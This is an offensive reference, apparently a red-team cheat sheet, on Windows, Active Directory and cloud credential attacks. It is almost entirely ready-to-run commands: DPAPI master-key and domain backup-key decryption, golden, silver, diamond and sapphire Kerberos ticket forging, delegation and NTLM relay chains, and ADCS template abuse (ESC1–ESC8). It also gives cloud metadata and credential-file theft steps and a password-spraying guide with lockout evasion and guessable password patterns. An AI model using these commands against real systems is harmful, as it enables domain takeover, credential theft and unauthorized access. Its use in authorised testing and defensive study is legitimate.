# Advanced Credential Attacks Reference

## DPAPI Deep Dive (T1555.004)

### Understanding DPAPI Architecture
```
User Master Key: %APPDATA%\Microsoft\Protect\<SID>\<GUID>
  └── Protected by: user password (PBKDF2) + domain backup key (AD environments)

Credential Files: %APPDATA%\Microsoft\Credentials\<GUID>
  └── Encrypted by: user master key

Chrome Login Data: encrypted by DPAPI → master key → user password or domain backup key
```

### Master Key Extraction (Local)
```
# List all master keys for current user
dir %APPDATA%\Microsoft\Protect\<SID>\

# Mimikatz — decrypt master key with user password
mimikatz # dpapi::masterkey /in:"%APPDATA%\Microsoft\Protect\S-1-5-21-...\<GUID>" /password:UserPassword123

# Mimikatz — decrypt master key via RPC (domain joined, as the user)
mimikatz # dpapi::masterkey /in:"%APPDATA%\Microsoft\Protect\S-1-5-21-...\<GUID>" /rpc

# SharpDPAPI — dump all master keys using current context
SharpDPAPI.exe masterkeys
SharpDPAPI.exe masterkeys /password:UserPassword123

# SharpDPAPI — triage all DPAPI-protected creds for current user
SharpDPAPI.exe triage
SharpDPAPI.exe credentials
```

### Domain Backup Key Abuse (Domain Admin Required)
```
# Extract domain DPAPI backup key (works for ALL users in domain)
mimikatz # lsadump::backupkeys /system:dc01.domain.local /export

# This exports:
#   ntds_capi_0_<guid>.pfx     (backup key as PFX)
#   ntds_legacy_0_<guid>.key   (legacy backup key)

# Use backup key to decrypt ANY user's master keys
SharpDPAPI.exe masterkeys /pvk:ntds_legacy_0.key
SharpDPAPI.exe credentials /pvk:ntds_legacy_0.key

# Decrypt all Chrome passwords across domain
SharpDPAPI.exe backupkey /server:dc01.domain.local
SharpDPAPI.exe machinemasterkeys /pvk:ntds_legacy_0.key

# Impacket — extract backup key remotely
impacket-dpapi backupkeys -t domain.local/admin:pass@dc01.domain.local --export
```

### Credential File Decryption Chain
```
# Step 1: Find credential files
dir /s /b C:\Users\*\AppData\Roaming\Microsoft\Credentials\*
dir /s /b C:\Users\*\AppData\Local\Microsoft\Credentials\*

# Step 2: Identify which master key encrypts each credential
mimikatz # dpapi::cred /in:C:\Users\jdoe\AppData\Roaming\Microsoft\Credentials\<GUID>
# → shows dwMasterKeyGuid that you need

# Step 3: Decrypt the master key (pick one method)
mimikatz # dpapi::masterkey /in:C:\Users\jdoe\AppData\Roaming\Microsoft\Protect\<SID>\<MK_GUID> /rpc

# Step 4: Decrypt the credential file with the unlocked master key
mimikatz # dpapi::cred /in:<cred_file> /masterkey:<hex_masterkey>
# → outputs plaintext target URL, username, password

# One-shot with SharpDPAPI (does all steps automatically)
SharpDPAPI.exe credentials /server:dc01.domain.local
```

---

## Kerberos Advanced Attacks

### Silver Ticket Forging (T1558.002)
```
# Forge a TGS for specific SPN — never touches the DC
# Requires: target service NTLM hash + domain SID

# CIFS access to a specific server
impacket-ticketer -nthash <SERVICE_NTLM_HASH> -domain-sid S-1-5-21-... -domain domain.local -spn CIFS/fileserver.domain.local administrator
export KRB5CCNAME=administrator.ccache
impacket-smbclient -k -no-pass fileserver.domain.local

# MSSQL access
impacket-ticketer -nthash <SVC_SQL_HASH> -domain-sid S-1-5-21-... -domain domain.local -spn MSSQLSvc/sqlserver.domain.local:1433 administrator
export KRB5CCNAME=administrator.ccache
impacket-mssqlclient -k -no-pass sqlserver.domain.local

# HTTP access (web services)
impacket-ticketer -nthash <SVC_HASH> -domain-sid S-1-5-21-... -domain domain.local -spn HTTP/webapp.domain.local administrator

# Rubeus (from Windows)
Rubeus.exe silver /service:CIFS/fileserver.domain.local /rc4:<HASH> /sid:S-1-5-21-... /user:administrator /domain:domain.local /ptt
```

### Golden Ticket Persistence (T1558.001)
```
# Forge TGT using krbtgt hash — god mode for the domain
# Requires: krbtgt NTLM hash + domain SID

# Impacket
impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid S-1-5-21-... -domain domain.local administrator
export KRB5CCNAME=administrator.ccache
impacket-secretsdump -k -no-pass dc01.domain.local

# Mimikatz
mimikatz # kerberos::golden /user:administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:<HASH> /ptt

# Survives password resets of ALL users EXCEPT krbtgt
# krbtgt password must be reset TWICE to invalidate (current + previous key)
```

### Diamond Ticket (Stealthier than Golden)
```
# Modify a legitimate TGT instead of forging from scratch
# Requests real TGT then decrypts and re-encrypts with modified PAC
# Harder to detect — ticket looks legitimate, has correct timestamps

Rubeus.exe diamond /krbkey:<KRBTGT_AES256_KEY> /user:administrator /enctype:aes256 /domain:domain.local /dc:dc01.domain.local /ticketuser:regularuser /ticketuserid:1234 /groups:512 /ptt

# Key advantage: encrypted with actual krbtgt key, has real ticket metadata
# Detection requires PAC inspection, not just ticket format checks
```

### Sapphire Ticket
```
# Uses S4U2Self to get a legitimate PAC for another user, then embeds it
# Even stealthier — PAC is genuinely issued by the DC

Rubeus.exe diamond /krbkey:<KRBTGT_AES256_KEY> /user:regularuser /password:Pass123 /enctype:aes256 /ticketuser:administrator /ticketuserid:500 /domain:domain.local /dc:dc01.domain.local /groups:512 /ptt /sapphire
```

### S4U2Self / S4U2Proxy Abuse (T1558)
```
# S4U2Self: Request a service ticket to yourself on behalf of any user
# S4U2Proxy: Forward that ticket to another service

# If you have a service account with constrained delegation to CIFS/fileserver:
impacket-getST -spn CIFS/fileserver.domain.local -impersonate administrator domain.local/svc_web:pass -dc-ip 10.10.10.1
export KRB5CCNAME=administrator@CIFS_fileserver.domain.local@DOMAIN.LOCAL.ccache
impacket-smbclient -k -no-pass fileserver.domain.local

# Rubeus
Rubeus.exe s4u /user:svc_web /rc4:<HASH> /impersonateuser:administrator /msdsspn:CIFS/fileserver.domain.local /ptt
```

### Delegation Attacks

#### Unconstrained Delegation
```
# Find computers with unconstrained delegation
impacket-findDelegation domain.local/user:pass -dc-ip 10.10.10.1

# Or via LDAP
ldapsearch -x -H ldap://10.10.10.1 -D "user@domain.local" -w 'pass' -b "dc=domain,dc=local" "(userAccountControl:1.2.840.113556.1.4.803:=524288)" dn

# If you compromise an unconstrained delegation host:
# Any user authenticating to it leaves their TGT in memory
# Coerce DC authentication with PrinterBug/PetitPotam:
python3 printerbug.py domain.local/user:pass@dc01.domain.local unconstrained-host.domain.local
# → DC$ TGT captured in memory → DCSync
Rubeus.exe monitor /interval:5 /filteruser:DC01$
```

#### Constrained Delegation
```
# Compromise service with constrained delegation → impersonate any user to allowed SPNs
impacket-getST -spn CIFS/target.domain.local -impersonate administrator domain.local/svc_constrained:pass
# Can also abuse alternate service name (SPN not validated):
impacket-getST -spn CIFS/target.domain.local -impersonate administrator -altservice ldap/target.domain.local domain.local/svc_constrained:pass
```

#### Resource-Based Constrained Delegation (RBCD)
```
# If you can write msDS-AllowedToActOnBehalfOfOtherIdentity on a target:
# Step 1: Create or use a computer account you control
impacket-addcomputer domain.local/user:pass -computer-name FAKEPC$ -computer-pass FakePass123 -dc-ip 10.10.10.1

# Step 2: Set RBCD on target
impacket-rbcd domain.local/user:pass -delegate-from FAKEPC$ -delegate-to TARGET$ -action write -dc-ip 10.10.10.1

# Step 3: Get impersonated ticket
impacket-getST -spn CIFS/target.domain.local -impersonate administrator domain.local/FAKEPC$:FakePass123 -dc-ip 10.10.10.1
export KRB5CCNAME=administrator@CIFS_target.domain.local@DOMAIN.LOCAL.ccache
impacket-secretsdump -k -no-pass target.domain.local
```

---

## NTLM Relay Advanced (T1557.001)

### Relay to LDAP — Shadow Credentials
```
# Coerce auth + relay to LDAP to set shadow credentials (msDS-KeyCredentialLink)
# Requires: LDAP signing NOT enforced (default on many DCs)

# Step 1: Start ntlmrelayx targeting LDAP
impacket-ntlmrelayx -t ldap://dc01.domain.local --shadow-credentials --shadow-target TARGET$

# Step 2: Coerce authentication from target
python3 PetitPotam.py -d domain.local -u user -p pass listener_ip dc01.domain.local

# Step 3: ntlmrelayx sets KeyCredentialLink → outputs certificate
# Step 4: Use certificate to get TGT
python3 gettgtpkinit.py -cert-pfx output.pfx -pfx-pass password domain.local/TARGET$ output.ccache
export KRB5CCNAME=output.ccache
impacket-secretsdump -k -no-pass dc01.domain.local
```

### Relay to LDAP — RBCD Setup
```
# Relay to LDAP to configure RBCD instead of shadow creds
impacket-ntlmrelayx -t ldap://dc01.domain.local --delegate-access

# Creates a machine account and sets RBCD delegation
# Then use S4U2Proxy to impersonate admin to the target
```

### Relay to ADCS (ESC8)
```
# Relay NTLM auth to AD Certificate Services web enrollment
impacket-ntlmrelayx -t http://ca.domain.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Coerce DC authentication
python3 PetitPotam.py -d domain.local -u user -p pass listener_ip dc01.domain.local

# ntlmrelayx requests certificate as the DC → outputs base64 cert
# Use certificate to authenticate
certipy auth -pfx dc01.pfx -dc-ip 10.10.10.1
# → outputs DC01$ NTLM hash → DCSync
```

### Relay to Exchange (PrivExchange)
```
# Relay to Exchange web services to grant DCSync rights
impacket-ntlmrelayx -t http://exchange.domain.local/EWS/Exchange.asmx -smb2support --escalate-user attacker

# Trigger Exchange authentication (PrivExchange or PushSubscription)
python3 privexchange.py -ah listener_ip exchange.domain.local -u user -p pass -d domain.local

# Exchange machine account has WriteDACL on domain → grants DCSync to attacker
```

### Multi-Relay Chains
```
# Relay to multiple targets simultaneously
impacket-ntlmrelayx -tf targets.txt -smb2support
# targets.txt contains one target per line:
# smb://fileserver.domain.local
# ldap://dc01.domain.local
# http://ca.domain.local/certsrv/certfnsh.asp

# With specific actions per protocol
impacket-ntlmrelayx -t smb://fileserver -c "whoami > C:\\temp\\pwned.txt" -smb2support
impacket-ntlmrelayx -t smb://fileserver -e payload.exe -smb2support
```

---

## Certificate Abuse — ADCS (T1649)

### ESC1: Misconfigured Certificate Template
```
# Template allows: enrollee supplies SAN + low-priv users can enroll
certipy find -u user@domain.local -p pass -dc-ip 10.10.10.1 -vulnerable -stdout

# Request certificate as domain admin
certipy req -u user@domain.local -p pass -ca CORP-CA -target ca.domain.local -template VulnTemplate -upn administrator@domain.local

# Authenticate with certificate
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
# → outputs administrator NTLM hash
```

### ESC2: Any Purpose Template
```
# Template has "Any Purpose" or no EKU → can be used for client auth
certipy req -u user@domain.local -p pass -ca CORP-CA -target ca.domain.local -template AnyPurposeTemplate
certipy auth -pfx output.pfx -dc-ip 10.10.10.1
```

### ESC3: Enrollment Agent Template
```
# Enrollment agent can request certs on behalf of other users
# Step 1: Get enrollment agent certificate
certipy req -u user@domain.local -p pass -ca CORP-CA -target ca.domain.local -template EnrollmentAgent

# Step 2: Request cert on behalf of admin
certipy req -u user@domain.local -p pass -ca CORP-CA -target ca.domain.local -template User -on-behalf-of 'domain\administrator' -pfx enrollment_agent.pfx
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```

### ESC4: Vulnerable Template ACLs
```
# You have write access to template → modify it to be ESC1 vulnerable
certipy template -u user@domain.local -p pass -template VulnACLTemplate -save-old
# Template now allows SAN → exploit as ESC1
certipy req -u user@domain.local -p pass -ca CORP-CA -target ca.domain.local -template VulnACLTemplate -upn administrator@domain.local
# Restore original template
certipy template -u user@domain.local -p pass -template VulnACLTemplate -configuration old_config.json
```

### ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 on CA
```
# CA has EDITF_ATTRIBUTESUBJECTALTNAME2 flag → any template becomes ESC1
certipy req -u user@domain.local -p pass -ca CORP-CA -target ca.domain.local -template User -upn administrator@domain.local
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```

### ESC7: CA Manager Approval Bypass
```
# You have ManageCA rights → add yourself as officer, approve your own requests
certipy ca -ca CORP-CA -add-officer user -u user@domain.local -p pass
certipy ca -ca CORP-CA -enable-template SubCA -u user@domain.local -p pass
certipy req -u user@domain.local -p pass -ca CORP-CA -target ca.domain.local -template SubCA -upn administrator@domain.local
# Request will be denied → issue it yourself
certipy ca -ca CORP-CA -issue-request <REQUEST_ID> -u user@domain.local -p pass
certipy req -u user@domain.local -p pass -ca CORP-CA -retrieve <REQUEST_ID>
```

### ESC8: NTLM Relay to Web Enrollment
```
# HTTP endpoint on CA allows NTLM auth → relay to it
# See NTLM Relay section above for full chain
impacket-ntlmrelayx -t http://ca.domain.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```

### Certificate Persistence
```
# Certificates survive password resets! Valid until expiry (usually 1 year)
# Export certificate + private key
certipy auth -pfx stolen_cert.pfx -dc-ip 10.10.10.1
# Works even after user changes password

# PFX to NTLM hash conversion
certipy auth -pfx user.pfx -dc-ip 10.10.10.1
# Certipy uses PKINIT to get TGT → UnPAC the hash → outputs NTLM

# Pass-the-Certificate with Rubeus
Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:pfxpass /ptt
```

---

## Cloud Credential Harvesting

### AWS IAM Key Extraction
```
# EC2 Instance Metadata Service (IMDS v1)
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
# Returns: AccessKeyId, SecretAccessKey, Token (temporary STS creds)

# IMDS v2 (requires token header)
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Lambda environment variables
env | grep AWS
# AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN always present in Lambda

# ECS Task Role credentials
curl -s http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI

# Credential file locations
cat ~/.aws/credentials
cat ~/.aws/config
# Environment: AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN
# EC2 parameter store
aws ssm get-parameters-by-path --path / --recursive --with-decryption --region us-east-1
```

### Azure Managed Identity Token Theft
```
# Instance Metadata Service
curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/"
curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/"

# Credential file locations
cat ~/.azure/accessTokens.json
cat ~/.azure/azureProfile.json
cat /etc/kubernetes/azure.json

# Azure App Service environment
env | grep -i "IDENTITY_HEADER\|IDENTITY_ENDPOINT\|MSI_"
curl -s -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2019-08-01"
```

### GCP Service Account Key Extraction
```
# Metadata server
curl -s -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
curl -s -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email

# Service account JSON key files
find / -name "*.json" -exec grep -l "private_key_id" {} \; 2>/dev/null
find / -name "*.json" -exec grep -l "type.*service_account" {} \; 2>/dev/null

# Application Default Credentials
cat ~/.config/gcloud/application_default_credentials.json
cat ~/.config/gcloud/credentials.db
cat ~/.config/gcloud/access_tokens.db

# GKE pods
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

### Cloud Credential File Locations (All Providers)
```
# AWS
~/.aws/credentials
~/.aws/config
~/.boto

# Azure
~/.azure/accessTokens.json
~/.azure/azureProfile.json

# GCP
~/.config/gcloud/application_default_credentials.json
~/.config/gcloud/credentials.db

# Kubernetes
~/.kube/config
/var/run/secrets/kubernetes.io/serviceaccount/token

# Terraform
*.tfstate (contains provider credentials in plaintext)
.terraform/
```

---

## Password Spray Intelligence

### Username Harvesting
```
# LinkedIn scraping (names → email format)
linkedin2username -u email@domain.com -c CompanyName -o usernames.txt

# Hunter.io — discover email format
curl -s "https://api.hunter.io/v2/domain-search?domain=target.com&api_key=KEY" | jq '.data.pattern'
# Common patterns: {first}.{last}, {f}{last}, {first}{l}

# Email format guessing + validation via SMTP
smtp-user-enum -M RCPT -U usernames.txt -t mail.target.com
# Or via Office 365 enumeration
python3 o365enum.py -e userlist.txt -t target.com

# Kerbrute user enumeration (AD — no auth events logged for invalid users)
kerbrute userenum --dc 10.10.10.1 -d domain.local usernames.txt

# Generate username lists from names
namemash.py names.txt > usernames.txt
# Produces: jdoe, john.doe, j.doe, johnd, etc.
```

### Lockout Threshold Detection
```
# Query domain password policy BEFORE spraying
crackmapexec smb 10.10.10.1 -u user -p pass --pass-pol
# Key fields: Minimum password length, Lockout threshold, Lockout duration, Lockout observation window

# LDAP query
ldapsearch -x -H ldap://10.10.10.1 -D "user@domain.local" -w 'pass' -b "dc=domain,dc=local" "(objectClass=domainDNS)" lockoutThreshold lockOutObservationWindow lockoutDuration

# Fine-grained password policies (may override default)
crackmapexec ldap 10.10.10.1 -u user -p pass -M get-fgpp
```

### Spray Timing Strategy
```
# Safe spray cadence:
# - 1 password per lockout observation window (typically 30 minutes)
# - Never exceed (threshold - 2) attempts per window
# - If threshold = 5, max 3 attempts per window
# - If threshold = 0, no lockout — spray freely (but still pace for stealth)

# Spray tools with built-in delays
sprayhound -U users.txt -p 'Summer2025!' -d domain.local -dc 10.10.10.1 --delay 1800
# Trevorspray — distributed spray across multiple IPs
trevorspray -u userlist.txt -p 'Winter2025!' -d target.com --delay 1800
```

### Seasonal and Org-Specific Password Patterns
```
# Common password patterns to try (prioritize these):
# Season+Year:    Spring2025!, Summer2025!, Winter2025!, Fall2025!
# Month+Year:     January2025!, February2025!, March2025!
# Company+digits: Acme2025!, Acme123!, AcmeIT2025!
# City+digits:    NewYork2025!, Chicago123!
# Sports teams:   Lakers2025!, Yankees123!
# Welcome:        Welcome1!, Welcome2025!
# Password:       Password1!, P@ssw0rd!, P@ssword2025!

# Build target-specific wordlist
echo -e "CompanyName2025!\nCompanyName123!\nCompanyName2024!" > spray_list.txt
```
